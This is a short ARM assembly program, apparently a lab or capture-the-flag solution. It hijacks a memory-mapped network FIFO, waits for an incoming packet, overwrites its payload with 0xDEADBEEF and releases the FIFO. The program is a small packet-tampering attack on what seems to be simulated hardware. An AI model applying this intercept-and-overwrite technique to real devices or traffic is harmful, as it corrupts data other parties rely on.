.text
    .global _start
_start:
    @ 1. Construct 0x80001000 in R0 (Hijack Address)
    MOV R0, #0x80
    LSL R0, R0, #24
    ADD R0, R0, #0x1000

    @ Hijack the FIFO
    MOV R1, #1
    STR R1, [R0]

    @ 2. Construct 0x80001004 in R2 (Status Address)
    MOV R2, #0x80
    LSL R2, R2, #24
    ADD R2, R2, #0x1000
    ADD R2, R2, #0x04      @ <--- Split 0x1004 into two valid additions

wait_loop:
    @ Wait for a packet (Poll Status Register)
    LDR R3, [R2]
    CMP R3, #1
    BNE wait_loop

    @ 3. Construct 0x80000000 in R4 (Payload Address)
    MOV R4, #0x80
    LSL R4, R4, #24
    LDR R5, [R4]           @ Read the original payload

    @ 4. Construct 0xDEADBEEF in R6 manually
    MOV R6, #0xDE
    LSL R6, R6, #8
    ADD R6, R6, #0xAD
    LSL R6, R6, #8
    ADD R6, R6, #0xBE
    LSL R6, R6, #8
    ADD R6, R6, #0xEF

    @ Overwrite the payload
    STR R6, [R4]

    @ 5. Release the FIFO back to the network 
    MOV R1, #0
    STR R1, [R0]

end_loop:
    B end_loop